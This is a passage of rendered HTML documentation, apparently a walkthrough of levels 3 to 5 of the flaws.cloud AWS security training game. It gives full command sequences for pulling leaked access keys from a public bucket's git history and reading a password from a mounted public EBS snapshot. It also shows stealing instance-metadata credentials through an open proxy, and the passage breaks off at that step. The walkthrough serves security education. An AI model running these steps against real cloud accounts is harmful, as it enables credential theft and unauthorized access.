+</span>aws iam get-user
+<span class="hll"><span class="c1"># Alternative is to use sts to get account:</span>
+</span>aws sts get-caller-identity --output text --query <span class="s1">&#39;Account&#39;</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="allusers-bucket-access">
+<h3>3.2.4.2. AllUsers bucket access<a class="headerlink" href="#allusers-bucket-access" title="Permalink to this headline">¶</a></h3>
+<p>Access the level 3 bucket as AllUsers:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
+
+<span class="c1"># List the bucket</span>
+<span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> s3 ls s3://<span class="nv">$D</span>/
+</span><span class="hll"><span class="c1"># Output includes: PRE .git/</span>
+</span>
+<span class="c1"># Get the git repo</span>
+mkdir -p <span class="nv">$LEVEL3</span>-repo/.git
+<span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> s3 sync s3://<span class="nv">$D</span>/.git <span class="nv">$LEVEL3</span>-repo/.git
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="analyze-the-git-repo">
+<h3>3.2.4.3. Analyze the git repo<a class="headerlink" href="#analyze-the-git-repo" title="Permalink to this headline">¶</a></h3>
+<p>Git repositories have been a historical source of leaked credentials:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<span class="nb">cd</span> <span class="nv">$LEVEL3</span>-repo
+<span class="hll">git log
+</span><span class="hll"><span class="c1"># Output includes: Oops, accidentally added something I shouldn&#39;t have</span>
+</span><span class="hll"><span class="c1"># Output includes: commit f52ec03b227ea6094b04e43f475fb0126edb5a61</span>
+</span><span class="hll">
+</span><span class="hll">git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+</span><span class="hll">ls
+</span><span class="hll"><span class="c1"># Output: access_keys.txt</span>
+</span><span class="hll">cat access_keys.txt
+</span><span class="hll"><span class="c1"># Output includes: access_key AKIAJ366LIPB4IJKT7SA</span>
+</span><span class="hll"><span class="c1"># Output includes: secret_access_key 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</span>
+</span><span class="nv">AK</span><span class="o">=</span><span class="k">$(</span>sed -n <span class="s1">&#39;/^access_key / {s/^access_key //;p}&#39;</span> access_keys.txt<span class="k">)</span>
+<span class="nv">SAK</span><span class="o">=</span><span class="k">$(</span>sed -n <span class="s1">&#39;/^secret_access_key / {s/^secret_access_key //;p}&#39;</span> access_keys.txt<span class="k">)</span>
+<span class="nb">cd</span> -
+
+<span class="c1"># create profile using the leaked keys</span>
+<span class="hll">cat <span class="s">&lt;&lt;EOF | aws configure --profile $LEVEL3</span>
+</span><span class="s">$AK</span>
+<span class="s">$SAK</span>
+<span class="s">$REGION</span>
+<span class="s">json</span>
+<span class="hll"><span class="s">EOF</span>
+</span>
+<span class="c1"># Test keys</span>
+<span class="hll">aws --profile <span class="nv">$LEVEL3</span> s3 ls
+</span><span class="hll"><span class="c1"># Output includes: level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</span>
+</span>
+<span class="hll"><span class="c1"># What about the user?</span>
+</span><span class="hll">aws --profile <span class="nv">$LEVEL3</span> iam get-user --output text
+</span><span class="hll"><span class="c1"># Output includes: User: arn:aws:iam::975426262029:user/backup</span>
+</span><span class="hll">aws --profile <span class="nv">$LEVEL3</span> --region <span class="nv">$REGION</span> sts get-caller-identity
+</span><span class="hll"><span class="c1"># Output includes: &quot;UserId&quot;: &quot;AIDAJQ3H5DC3LEG2BKSLC&quot;</span>
+</span><span class="hll"><span class="c1"># Output includes: &quot;Account&quot;: &quot;975426262029&quot;</span>
+</span><span class="hll"><span class="c1"># Output includes: &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:user/backup&quot;</span>
+</span></pre></div>
+</div>
+<p>Use Truffle Hog for an alternative approach to finding the Git credentials:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+
+pip install -U truffleHog
+<span class="hll">trufflehog --regex --entropy<span class="o">=</span>False <span class="nv">$LEVEL3</span>-repo
+</span><span class="c1"># ~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="c1"># Reason: AWS API Key</span>
+<span class="c1"># Date: 2017-09-17 15:10:43</span>
+<span class="c1"># Hash: f52ec03b227ea6094b04e43f475fb0126edb5a61</span>
+<span class="c1"># Filepath: access_keys.txt</span>
+<span class="c1"># Branch: origin/master</span>
+<span class="c1"># Commit: Oops, accidentally added something I shouldn&#39;t have</span>
+
+<span class="c1"># AKIAJ366LIPB4IJKT7SA</span>
+<span class="c1"># ~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="c1"># ~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="c1"># Reason: AWS API Key</span>
+<span class="c1"># Date: 2017-09-17 15:10:07</span>
+<span class="c1"># Hash: f52ec03b227ea6094b04e43f475fb0126edb5a61</span>
+<span class="hll"><span class="c1"># Filepath: access_keys.txt</span>
+</span><span class="c1"># Branch: origin/master</span>
+<span class="hll"><span class="c1"># Commit: first commit</span>
+</span>
+<span class="c1"># AKIAJ366LIPB4IJKT7SA</span>
+<span class="c1"># ~~~~~~~~~~~~~~~~~~~~~</span>
+</pre></div>
+</div>
+<p>This identifies the commit/file candidates for AWS credentials allowing the exploit to continue as shown above.</p>
+</div>
+<div class="section" id="audit-the-compromised-keys">
+<h3>3.2.4.4. Audit the compromised keys<a class="headerlink" href="#audit-the-compromised-keys" title="Permalink to this headline">¶</a></h3>
+<p>The goal is to collect information from <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html">AWS Security Audit Guidelines</a> with user <em>backup</em>. Here use <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
+
+pip install -U awsscout2
+<span class="hll">Scout2 --profile <span class="nv">$LEVEL3</span> --region <span class="nv">$REGION</span> --report-dir scout2-<span class="nv">$LEVEL3</span>
+</span><span class="c1"># Directory scout2-$LEVEL3 contains HTML report:</span>
+<span class="hll"><span class="o">(</span><span class="nb">cd</span> scout2-<span class="nv">$LEVEL3</span><span class="p">;</span> python3 -m http.server <span class="m">8080</span><span class="o">)</span>
+</span><span class="hll"><span class="c1"># Browse report ...</span>
+</span>
+<span class="c1"># For detailed information:</span>
+<span class="hll">tail scout2-<span class="nv">$LEVEL3</span>/inc-awsconfig/aws_config-<span class="nv">$LEVEL3</span>.js -n +2 <span class="se">\</span>
+</span><span class="hll">  <span class="p">|</span> jq <span class="s1">&#39;.&#39;</span> <span class="se">\</span>
+</span><span class="hll">  <span class="p">|</span> tee <span class="nv">$LEVEL3</span>-scout2.json
+</span><span class="c1"># From this list of services:</span>
+<span class="c1">#   cloudformation cloudtrail cloudwatch directconnect</span>
+<span class="c1">#   ec2 efs elasticache elb elbv2 emr iam awslambda</span>
+<span class="c1">#   redshift rds route53 route53domains s3 ses sns sqs vpc</span>
+<span class="c1"># only ec2 and vpc show interesting results:</span>
+<span class="hll"><span class="k">for</span> SERVICE in ec2 vpc<span class="p">;</span> <span class="k">do</span>
+</span><span class="hll">  jq <span class="s1">&#39;.services.&#39;</span><span class="nv">$SERVICE</span><span class="s1">&#39;.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;]&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json <span class="p">|</span> tee <span class="nv">$LEVEL3</span>-service-<span class="nv">$SERVICE</span>.json
+</span><span class="hll"><span class="k">done</span>
+</span><span class="hll"><span class="c1"># NOTE: Scout2 shows no buckets</span>
+</span>jq <span class="s1">&#39;.services.s3.buckets_count&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json  <span class="c1"># 0 buckets</span>
+<span class="hll"><span class="c1"># But there are indeed buckets listed here</span>
+</span>aws --profile <span class="nv">$LEVEL3</span> s3 ls
+
+<span class="hll"><span class="c1"># A summary of  ec2</span>
+</span>jq <span class="s1">&#39;.services.ec2.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;].snapshots&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json
+<span class="c1"># Note - createVolumPermission.Group = all, meaning anyone can use snapshot</span>
+jq <span class="s1">&#39;.services.ec2.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;].volumes&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json
+jq <span class="s1">&#39;.services.ec2.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;].vpcs | keys[] as $k | .[$k].instances&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json
+<span class="c1"># jq &#39;.services.ec2.regions[&quot;&#39;$REGION&#39;&quot;].vpcs.&quot;vpc-1052ce77&quot;.instances&#39; $LEVEL3-scout2.json</span>
+jq <span class="s1">&#39;.services.ec2.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;].vpcs | keys[] as $k | .[$k].network_interfaces&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json
+jq <span class="s1">&#39;.services.ec2.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;].vpcs | keys[] as $k | .[$k].security_groups&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json
+</pre></div>
+</div>
+<p>This reconnaisance will be used in Level 4. Note the <code class="docutils literal notranslate"><span class="pre">Scout2</span></code> output is quite useful despite the limited <em>backup</em> user permissions.</p>
+</div>
+</div>
+<div class="section" id="id25">
+<h2>3.2.5. <a class="reference external" href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud">flaws.cloud Level 4</a><a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="level-4-aws-background">
+<h3>3.2.5.1. Level 4 AWS background<a class="headerlink" href="#level-4-aws-background" title="Permalink to this headline">¶</a></h3>
+<p>For an introduction to snapshots see <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSSnapshots.html">AWS EC2 - Amazon EBS Snapshots</a> and for sharing snapshots see <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html">AWS EC2 - Sharing an Amazon EBS Snapshot</a>. A public snapshot gives access to server data which can be used in an exploit.</p>
+</div>
+<div class="section" id="verify-level-4-is-an-ec2-instance">
+<h3>3.2.5.2. Verify Level 4 is an EC2 instance<a class="headerlink" href="#verify-level-4-is-an-ec2-instance" title="Permalink to this headline">¶</a></h3>
+<p>Our goal is “to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud” which is protected by a Username/Password. First verify it’s an EC2 instance as claimed:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+
+<span class="c1"># verify web server running on EC2</span>
+<span class="hll">dig <span class="nv">$DNS</span> +short <span class="nv">$D</span>
+</span><span class="hll"><span class="c1"># Output: ec2-35-165-182-7.us-west-2.compute.amazonaws.com.</span>
+</span><span class="c1"># Output: 35.165.182.7</span>
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> head -n1 <span class="p">|</span> cut -d. -f2<span class="k">)</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="exploit-public-snapshot">
+<h3>3.2.5.3. Exploit public snapshot<a class="headerlink" href="#exploit-public-snapshot" title="Permalink to this headline">¶</a></h3>
+<p>Level 3 left us with <em>backup</em>’s credentials and reconnaisance results from <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>. Prominent among those results is there is 1 EC2 instance with 1 snapshot of it’s disk volume. One way to exploit the snapshot is: restore the snapshot to a volume, mount the volume on an EC2 instance, then explore the volume for exploit potentials. Level 3 credentials are required to recon that snapshot, your hacker account creates the EC2 instance using the public snapshot.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<span class="nv">LEVEL4</span><span class="o">=</span>level4
+<span class="nv">HACKER</span><span class="o">=</span>hacker
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> head -n1 <span class="p">|</span> cut -d. -f2<span class="k">)</span>
+<span class="nv">ACCOUNT</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$LEVEL3</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+    sts get-caller-identity --output text --query <span class="s1">&#39;Account&#39;</span><span class="k">)</span>
+<span class="nv">TYPE</span><span class="o">=</span>t2.nano
+
+<span class="hll"><span class="c1"># There are multiple ways to get the snapshot id:</span>
+</span><span class="hll"><span class="c1">#   Get it from the level3 reconnaisance dump:</span>
+</span><span class="hll"><span class="nv">SNAP</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.services.ec2.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;].snapshots | keys[0]&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json<span class="k">)</span>
+</span><span class="c1">#   Get snapshots restorable by backup user</span>
+aws --profile <span class="nv">$LEVEL3</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 describe-snapshots --restorable-by-user-ids <span class="nv">$ACCOUNT</span> <span class="se">\</span>
+    --query <span class="s1">&#39;Snapshots[0].SnapshotId&#39;</span> --output text
+<span class="c1">#   Get snapshots owned by backup user</span>
+aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 describe-snapshots --owner-ids <span class="nv">$ACCOUNT</span> <span class="se">\</span>
+    --query <span class="s1">&#39;Snapshots[0].SnapshotId&#39;</span> --output text
+<span class="c1">#   Get instance volume snapshots</span>
+<span class="nv">VOL</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$LEVEL3</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 describe-instances --output text <span class="se">\</span>
+    --query <span class="s1">&#39;Reservations[0].Instances[0].BlockDeviceMappings[0].Ebs.VolumeId&#39;</span> <span class="se">\</span>
+<span class="k">)</span>
+aws --profile <span class="nv">$LEVEL3</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 describe-snapshots --filter <span class="s2">&quot;Name=volume-id,Values=</span><span class="nv">$VOL</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --query <span class="s1">&#39;Snapshots[0].SnapshotId&#39;</span> --output text
+
+<span class="hll"><span class="c1"># NOTE: other writeups mentioned the availability zone (AZ). You should know:</span>
+</span><span class="hll"><span class="c1">#   Different accounts using the same AZ id may refer to a different actual AZ.</span>
+</span><span class="hll"><span class="c1">#   Said another way, us-west-2a for your account may be a different AZ for my account.</span>
+</span><span class="hll"><span class="c1">#   There is no way to force a resource into the same AZ as another account.</span>
+</span><span class="hll"><span class="c1"># The good news is that restoring a snapshot only requires it be in the same region.</span>
+</span>
+<span class="hll"><span class="c1"># Start instance with snapshot attached:</span>
+</span><span class="hll"><span class="c1">#   Security group allows inbound SSH</span>
+</span><span class="nv">SG</span><span class="o">=</span><span class="nv">$LEVEL4</span>-sg
+<span class="nv">SGID</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+    ec2 create-security-group --group-name <span class="nv">$SG</span> <span class="se">\</span>
+        --description <span class="s1">&#39;SSH to instance&#39;</span> --output text <span class="se">\</span>
+<span class="k">)</span>
+aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 authorize-security-group-ingress --group-name <span class="nv">$SG</span> <span class="se">\</span>
+  --protocol tcp --port <span class="m">22</span> --cidr <span class="m">0</span>.0.0.0/0
+<span class="hll"><span class="c1">#   SSH keys</span>
+</span><span class="nv">KEYNAME</span><span class="o">=</span><span class="nv">$LEVEL4</span>-key
+aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 create-key-pair --key-name <span class="nv">$KEYNAME</span> <span class="se">\</span>
+    --query <span class="s1">&#39;KeyMaterial&#39;</span> --output text <span class="se">\</span>
+  <span class="p">|</span> tee <span class="nv">$KEYNAME</span>.pem
+chmod <span class="m">600</span> <span class="nv">$KEYNAME</span>.pem
+<span class="hll"><span class="c1"># Get region&#39;s Ubuntu AMI</span>
+</span><span class="nv">AMI</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="s2">&quot;</span><span class="nv">$REGION</span><span class="s2">&quot;</span> <span class="se">\</span>
+        ec2 describe-images --owners <span class="m">099720109477</span> <span class="se">\</span>
+          --filters <span class="nv">Name</span><span class="o">=</span>root-device-type,Values<span class="o">=</span>ebs <span class="se">\</span>
+                    <span class="nv">Name</span><span class="o">=</span>architecture,Values<span class="o">=</span>x86_64 <span class="se">\</span>
+                    <span class="nv">Name</span><span class="o">=</span>name,Values<span class="o">=</span><span class="s1">&#39;*hvm-ssd/ubuntu-bionic-18.04*&#39;</span> <span class="se">\</span>
+          --query <span class="s1">&#39;Images[].[CreationDate,ImageId,Name]&#39;</span> --output text <span class="se">\</span>
+      <span class="p">|</span> sort -k1 <span class="p">|</span> tail -n1 <span class="p">|</span> gawk <span class="s1">&#39;{print $2}&#39;</span> <span class="se">\</span>
+<span class="k">)</span>
+<span class="hll"><span class="c1"># Fire up the VM</span>
+</span><span class="nv">VMNAME</span><span class="o">=</span><span class="nv">$LEVEL4</span>
+<span class="nv">INSTANCE</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 run-instances --image-id <span class="s2">&quot;</span><span class="nv">$AMI</span><span class="s2">&quot;</span> --count <span class="m">1</span> <span class="se">\</span>
+    --instance-type <span class="s2">&quot;</span><span class="nv">$TYPE</span><span class="s2">&quot;</span> --key-name <span class="s2">&quot;</span><span class="nv">$KEYNAME</span><span class="s2">&quot;</span> --security-group-ids <span class="s2">&quot;</span><span class="nv">$SGID</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --block-device-mappings <span class="s2">&quot;DeviceName=/dev/xvdf,Ebs={DeleteOnTermination=true,SnapshotId=</span><span class="nv">$SNAP</span><span class="s2">}&quot;</span> <span class="se">\</span>
+    --tag-specifications <span class="s1">&#39;ResourceType=instance,Tags=[{Key=Name,Value=&#39;</span><span class="nv">$VMNAME</span><span class="s1">&#39;}]&#39;</span> <span class="se">\</span>
+    --query <span class="s1">&#39;Instances[0].InstanceId&#39;</span> --output text <span class="se">\</span>
+<span class="k">)</span>
+
+<span class="hll"><span class="c1"># Another way to get the instance ID</span>
+</span><span class="nv">INSTANCE</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> ec2 describe-instances <span class="se">\</span>
+                --filters <span class="s2">&quot;Name=tag:Name,Values=</span><span class="nv">$VMNAME</span><span class="s2">&quot;</span> <span class="se">\</span>
+                --query <span class="s1">&#39;Reservations[*].Instances[*].InstanceId&#39;</span> <span class="se">\</span>
+                --output text <span class="se">\</span>
+<span class="k">)</span>
+
+<span class="hll"><span class="c1"># Get the public DNS name</span>
+</span><span class="nv">PUBDNS</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+           ec2 describe-instances <span class="se">\</span>
+             --filters <span class="s2">&quot;Name=tag:Name,Values=</span><span class="nv">$VMNAME</span><span class="s2">&quot;</span> <span class="se">\</span>
+             --query <span class="s1">&#39;Reservations[*].Instances[*].PublicDnsName&#39;</span> <span class="se">\</span>
+             --output text <span class="se">\</span>
+<span class="k">)</span>
+
+<span class="hll"><span class="c1"># Wait for instance running</span>
+</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+  ec2 <span class="nb">wait</span> instance-running --instance-ids <span class="s2">&quot;</span><span class="nv">$INSTANCE</span><span class="s2">&quot;</span>
+
+<span class="hll"><span class="c1"># Use the VM</span>
+</span>ssh -i <span class="s2">&quot;</span><span class="nv">$KEYNAME</span><span class="s2">.pem&quot;</span> ubuntu@<span class="nv">$PUBDNS</span>
+
+<span class="hll">sudo mount /dev/xvdf1 /mnt
+</span><span class="hll"><span class="c1"># After a bit of reconnaissance:</span>
+</span><span class="hll">cat /mnt/home/ubuntu/setupNginx.sh
+</span><span class="hll"><span class="c1"># Output: htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</span>
+</span><span class="hll">sudo shutdown -h now
+</span></pre></div>
+</div>
+<p>On the website <a class="reference external" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/</a> enter Username flaws and Password nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M getting the output:</p>
+<blockquote>
+<div>Good work getting in. This level is described at <a class="reference external" href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a></div></blockquote>
+<p id="flaws-delete-instance">To clean up the created EC2 resources:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> head -n1 <span class="p">|</span> cut -d. -f2<span class="k">)</span>
+<span class="nv">HACKER</span><span class="o">=</span>hacker
+<span class="nv">LEVEL4</span><span class="o">=</span>level4
+<span class="nv">SG</span><span class="o">=</span><span class="nv">$LEVEL4</span>-sg
+<span class="nv">KEYNAME</span><span class="o">=</span><span class="nv">$LEVEL4</span>-key
+<span class="nv">VMNAME</span><span class="o">=</span><span class="nv">$LEVEL4</span>
+<span class="hll"><span class="nv">INSTANCE</span><span class="o">=</span><span class="k">$(</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> ec2 describe-instances <span class="se">\</span>
+</span><span class="hll">               --filters <span class="s2">&quot;Name=tag:Name,Values=</span><span class="nv">$VMNAME</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">               --query <span class="s1">&#39;Reservations[*].Instances[*].InstanceId&#39;</span> <span class="se">\</span>
+</span><span class="hll">               --output text <span class="se">\</span>
+</span><span class="hll"><span class="k">)</span>
+</span><span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+</span><span class="hll">  ec2 terminate-instances --instance-ids <span class="nv">$INSTANCE</span>
+</span><span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+</span><span class="hll">  ec2 delete-key-pair --key-name <span class="nv">$KEYNAME</span>
+</span><span class="hll">rm <span class="nv">$KEYNAME</span>.pem
+</span><span class="hll">aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> <span class="se">\</span>
+</span><span class="hll">  ec2 delete-security-group --group-name <span class="nv">$SG</span>
+</span></pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="id26">
+<h2>3.2.6. <a class="reference external" href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">flaws.cloud Level 5</a><a class="headerlink" href="#id26" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="level-5-aws-background">
+<h3>3.2.6.1. Level 5 AWS background<a class="headerlink" href="#level-5-aws-background" title="Permalink to this headline">¶</a></h3>
+<p>This exploit hinges on using <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">AWS EC2 - Instance Metadata and User Data</a>. Specifically, if a host allows access to <a class="reference external" href="http://169.254.169.254">http://169.254.169.254</a> then critical security information can be leaked. For retrieving and using credentials see <a class="reference external" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html#instance-metadata-security-credentials">AWS EC2 - Retrieving Security Credentials from Instance Metadata</a>, <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html#using-temp-creds-sdk-cli">AWS IAM - Using Temporary Security Credentials with the AWS CLI</a>, and <a class="reference external" href="https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html">AWS CLI - Configuring the AWS CLI</a>. Here’s an example:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Get the creds</span>
+<span class="nv">ROLE</span><span class="o">=</span>some-role
+<span class="hll">curl --silent http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="nv">$ROLE</span>/ <span class="se">\</span>
+</span><span class="hll">  <span class="p">|</span> tee creds.json
+</span><span class="nv">AK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.AccessKeyId&#39;</span> creds.json<span class="k">)</span>
+<span class="nv">SAK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.SecretAccessKey&#39;</span> creds.json<span class="k">)</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.Token&#39;</span> creds.json<span class="k">)</span>
+
+<span class="hll"><span class="c1"># Use the creds</span>
+</span><span class="o">(</span>
+<span class="nb">export</span> <span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$AK</span><span class="s2">&quot;</span>
+<span class="nb">export</span> <span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SAK</span><span class="s2">&quot;</span>
+<span class="nb">export</span> <span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span>
+aws --region us-west-2 ec2 describe-instances
+<span class="o">)</span>
+
+<span class="hll"><span class="c1"># Create a profile</span>
+</span><span class="nv">HACKER</span><span class="o">=</span>myprofile
+<span class="nv">REGION</span><span class="o">=</span>us-west-2
+cat <span class="s">&lt;&lt;EOF | aws configure --profile $HACKER</span>
+<span class="s">$AK</span>
+<span class="s">$SAK</span>
+<span class="s">$REGION</span>
+<span class="s">json</span>
+<span class="s">EOF</span>
+aws --profile <span class="nv">$HACKER</span> configure <span class="nb">set</span> aws_session_token <span class="s2">&quot;</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span>
+
+<span class="hll"><span class="c1"># Use the profile</span>
+</span>aws --profile <span class="nv">$HACKER</span> --region <span class="nv">$REGION</span> ec2 describe-instances
+</pre></div>
+</div>
+</div>
+<div class="section" id="exploit-the-proxy-to-get-meta-data">
+<h3>3.2.6.2. Exploit the proxy to get meta-data<a class="headerlink" href="#exploit-the-proxy-to-get-meta-data" title="Permalink to this headline">¶</a></h3>
+<p>The proxy not restricting IPs allows fetching instance metadata, leading to a credentials leak, resulting in the goal of listing the contents of the level 6 bucket.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL5</span><span class="o">=</span>level5
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> head -n1 <span class="p">|</span> cut -d. -f2<span class="k">)</span>
+
+<span class="hll"><span class="c1"># Get the role, then credentials</span>
+</span><span class="nv">PROXY</span><span class="o">=</span><span class="nv">$D</span>/proxy
